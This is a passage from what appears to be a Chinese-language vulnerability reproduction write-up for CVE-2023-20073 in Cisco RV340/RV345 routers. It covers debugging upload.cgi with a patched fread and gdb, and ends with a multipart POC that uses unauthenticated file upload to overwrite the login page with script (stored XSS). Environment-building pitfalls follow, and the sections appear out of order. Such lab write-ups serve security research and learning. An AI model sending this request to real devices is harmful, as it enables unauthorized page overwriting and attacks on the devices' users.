
### multipart_parser_init

这个函数初始化了一个结构体，该结构体结构示意图如下

![图片描述](upload/attach/202404/952954_TM8DR865ZV2DY3W.webp)

最后该结构体被传递到`multipart_parser_execute`进行进一步处理

### multipart_parser_execute

笔者在最初调试cgi的时候尝试通过`*qemu-user*`+`*IDA*`的来进行调试，所以遇到了一些问题，便分析了这个函数，众嗦粥知 :)，cgi读取请求数据是通过`stdin`进行读取的，所以我尝试通过这种形式来直接模拟请求输入数据

![图片描述](upload/attach/202404/952954_GJUSMXZUMRV9T8Q.webp)

也既直接在终端中输入，但不论如何都没有数据被成功解析，最后发现问题出在这个函数中，该函数通过结构体的`boundary`作为一个判断，`index`作为数据光标位置和`operateCode`记录当前所处位置数据所属(既数据还是头)

而其中判断`operateCode`的重要决定条件就是换行符`\r\n`，其它的头部判断则通过`:`,`;`等符号进行

这就是为什么上述偷懒方法不生效的原因

## 2.3 分析结论

上传文件处理程序`upload.cgi`中将文件保存操作提前至授权检查前，使其只需被调用且参数正确即可将文件保存至不同目录下。其中保存目录部分可控，保存文件名可控，保存目录可控中可利用项有`/var/www/`目录，可通过覆盖其主路由页面实施存储型XSS攻击

需要控制的字段(参数)：

- `pathparam`: 控制存储目录
- `fileparam`: 控制保存文件名

## 2.4 Patch&调试分析

由于上述的偷懒调试法因为解析函数的原因无效(或许有其它的数据输入法，但是我没有探究了)。于是需要对`upload.cgi`进行patch后调试，因为cgi程序的特性，一次请求一次执行瞬间完成，既无法可控的通过调试器启动也无法在正常情况下当其执行时附加它，所以需要进行patch

通过上文的`upload.cgi` `main`函数伪代码可知其通过调用`fread`对`stdin`进行读取，所以可以patch它的读取长度参数使其等待

```
01 10 A0 E3 MOV R1, #1
06 20 A0 E1 MOV R2, R6
↓↓ ↓↓ ↓↓ ↓↓↓ ↓ ↓↓
01 20 86 E2 ADD R2, R6, #1
00 50 A0 E1 MOV R5, R0
00 30 93 E5 LDR R3, [R3]
76 FF FF EB BL fread
```

将原长度`R6`修改为`R6+1`即可，现在我们发送测试报文如下

![图片描述](upload/attach/202404/952954_CWTZ9T2CPUNHHT2.webp)

此时`BurpSuite`进入了等待状态，我们查看虚拟机的后台进程

![图片描述](upload/attach/202404/952954_EXFTR52P3E6M3RH.webp)

从主机传入 `gdb-server` 对其进行附加调试，`gdb-multiarch`连接后可见其停在了`SYS_read`调用处等待，我们直接修改`PC`寄存器让其跳过并恢复正常流程

![图片描述](upload/attach/202404/952954_HK42CKF7ET3F9SP.webp)

将断点设置在参数获取的位置并放行

![图片描述](upload/attach/202404/952954_MHWSRSA4RXFZWTF.webp)

![图片描述](upload/attach/202404/952954_HZF7UFKF9Z24HYT.webp)

![图片描述](upload/attach/202404/952954_CCK8M4U6HKUHU45.webp)

![图片描述](upload/attach/202404/952954_SEPZB92EJ3MAKCH.webp)

可见参数`pathparam`成功的控制了，而filename是生成的，这个是临时文件的保存目录，不影响所以无需控制。

# 3. 漏洞利用

已知需要控制内容如下

- `pathparam=Portal`
- `fileparam=login.html`

## 3.1 发送攻击报文

![图片描述](upload/attach/202404/952954_DVJ6T9EU6GBK4XT.webp)

## 3.2 查看关键函数调用

![图片描述](upload/attach/202404/952954_D3GBQYH6RPUNYPH.webp)

![图片描述](upload/attach/202404/952954_6D9Y9WFSKE2RC2K.webp)

![图片描述](upload/attach/202404/952954_N96AH85EAU5RW33.webp)

## 3.3 POC

```
-----------------------------215054393430560510652237632940
Content-Disposition: form-data; name="pathparam"
Portal
-----------------------------215054393430560510652237632940
Content-Disposition: form-data; name="fileparam"
login.html
-----------------------------215054393430560510652237632940
Content-Disposition: form-data; name="file"; filename="isFileName"
Content-Type: text/plain
<script>alert("Hi there :)")</script>
-----------------------------215054393430560510652237632940--
```

![图片描述](upload/attach/202404/952954_38R537ABHBXF2BU.webp)

# 4.写在最后

eh。花了一周多的时间，终于把本篇内容完成并把笔记和文章写完了，最后文章总结下来其实内容不多（当然我也不擅长表达和总结），多少有点删减，只挑了我觉得重要的地方指出来和关键的部分记录下来，这是我做的第四个，hum算第三个吧，因为的第二个DIR823G其实和第一个DIR815本质上没区别，第二个做的是TOTOLINK的命令注入漏洞，那个也没什么很复杂的逻辑，

## 4.1 关于一些踩的坑

### 4.1.1 编译内核

#### 启动报错

hum因为我比较倔，最开始其实`4.12.12`的内核成功编译了并且跑起来了环境(没有IPV6和启动参数)的问题，不过我就是想用`3.2.1`的:)。但是同样的编译通过，使用`3.2.1`内核的虚拟机却是各种起不来，我各种参数都调了一边，比如文件系统格式支持等。最开始的报错信息如下

```
No filesystem could mount root, tried: ext3 ext2 ext4 cramfs vfat
Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(179,0)
```

我在配置文件中启用了`ext4`的支持但依旧如此，最后发现是由于内核启动参数没有生效导致，必须在编译的时候指定`CONFIG_CMDLINE`

#### 服务启动失败

上文说过在启动`confd`服务的时候要看见最后的`PnP Agent is starting!`才算成功，但是我最开始一直失败，报错如下

```
Address family not supported by protocol family
```

最后在配置文件里找到了`IPV6`的选项并启用了

#### 各种写操作无法完成报错

只要涉及写操作都会报错

```
xxxx Read-only file system
```

然后发现系统根目录挂载的是`ro`的，但是我也没法通过指令重新挂载，这个问题不论在`4.12.12`版本的内核还是`3.2.1`版本的内核都出现了，最后在一篇文章中找到答案，在配置文件中设置`CONFIG_LBDAF=y`

#### 服务启动内存溢出

这个问题在上文中我也简述过了，在`3.2.1`版本的内核中出现，解决方法是在启动参数中添加`mem=128M`

### 4.1.2 调试过程中遇到的坑

#### cgi没有解析出数据(HackBar)

有读者可能会好奇我上文怎么不用*hackbar*去发请求而是选择直接在bp中发，当我在 *hackbar* 中写入如下数据

```
-----
Content-Disposition: form-data; name="isName"; filename="isFileName"; Content-Type: text/plain
hello
-----
```

乍一看好像其实没什么问题，但是注意在数据段头和数据之间的换行，那有一个空格，这导致最后发出去的包是这个样子的

```
-----
Content-Disposition: form-data; name="undifined";
Content-Disposition: form-data; name="isName"; filename="isFileName"; Content-Type: text/plain
hello
-----
```

#### nginx没有转发到uwsgi

这个问题我还没有找到原因，推测是数据段长度不够(但这只是现象)，因为我各种测试之后只得出了这个结论，结合上一个问题错上加错之下让我碰壁相当之久

例如当我发送数据

```
-----
Content-Disposition: form-data; name="isName"; filename="isFileName"; Content-Type: text/plain
hello
-----
```

nginx将这个临时文件保存了，但是没有成功转发给`uwsgi`(我附加调试了它)，但是nginx本身似乎也在等待回复，所以临时文件既没有被清除，nginx也没有回复我的请求。加上上一个错误之后，我发送了错误的(我自己不知道)报文如下

```
-----
Content-Disposition: form-data; name="undifined";
Content-Disposition: form-data; name="isName"; filename="isFileName"; Content-Type: text/plain
hello
hello
-----
```

它被Nginx转发了，但是自然而然的`upload.cgi`无法解析了

## 4.2 总结

在准备环境，既内核那一部分，加上踩坑我花了两天半来解决，在hackbar的那个部分遇见问题到弄清楚原因，我花了两天半的时间来解决，其它大大小小的问题也是一天多，差不多一周，感觉还是挺，容易进坑的我 :)

到最后还有一个遗留问题就是nginx为什么没有转发请求到`uwsgi`，蹲一个路过大神回复解答一手

> 漏洞编号: CVE-2023-20073
>
> CVSS3 评分: 9.8
>
> 标签: #漏洞复现
>
> 关键字: 未授权文件上传
>
> 引用链接：
>
> - [AVD](https://bbs.kanxue.com/elink@58cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2N6X3c8Q4x3X3g2S2L8r3W2&6N6h3&6Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3@1k6A6k6q4)9K6c8p5q4h3c8q4)9J5k6o6t1H3x3U0y4Q4x3X3b7J5x3o6l9%4x3H3`.`.)

> ⚠️ 影响设备:
>
> - Cisco rv340w_firmware
> - Cisco rv340_firmware
> - Cisco rv345p_firmware

# 1. 准备工作

## 1.1 下载所需文件

- [固件](https://bbs.kanxue.com/elink@74bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8$3k6@1N6$3q4J5k6g2)9J5k6h3y4A6M7$3y4G2i4K6u0W2j5$3!0E0i4K6u0r3k6r3!0%4L8X3I4G2j5h3c8Q4x3V1k6Z5L8$3#2W2i4K6u0r3x3U0R3$3x3U0R3%4y4K6V1I4i4K6u0r3N6s2W2H3k6g2)9J5c8U0t1^5x3U0b7$3y4e0M7^5z5g2)9J5c8Y4u0W2L8r3g2S2M7$3g2Q4x3V1j5I4i4K6u0W2x3q4)9J5k6e0l9K6i4K6u0W2x3U0V1`.)

- [Linux源码](https://bbs.kanxue.com/elink@b87K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0K9i4u0J5L8%4u0K6i4K6u0W2k6h3c8Y4k6g2)9J5k6h3E0W2M7X3&6W2L8q4)9J5k6h3!0J5k6#2)9J5c8Y4m8#2j5W2)9J5c8X3I4A6L8Y4g2^5i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3)
